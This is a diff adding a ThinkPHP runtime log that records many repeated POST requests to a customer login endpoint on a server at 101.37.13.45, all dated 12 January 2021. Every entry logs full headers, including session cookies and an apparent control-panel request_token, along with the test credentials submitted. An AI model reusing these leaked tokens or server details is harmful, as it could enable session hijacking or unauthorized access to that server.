+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020164s] [吞吐率：49.59req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018853s] [吞吐率：53.04req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019074s] [吞吐率：52.43req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:38:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019795s] [吞吐率：50.52req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:45+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019606s] [吞吐率：51.00req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:46+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.021576s] [吞吐率：46.35req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:46+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018605s] [吞吐率：53.75req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:46+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019629s] [吞吐率：50.95req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:46+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018578s] [吞吐率：53.83req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:46+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019763s] [吞吐率：50.60req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:49+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018836s] [吞吐率：53.09req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:49+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018111s] [吞吐率：55.22req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:41:49+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018238s] [吞吐率：54.83req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:02+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019597s] [吞吐率：51.03req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020578s] [吞吐率：48.60req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020326s] [吞吐率：49.20req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
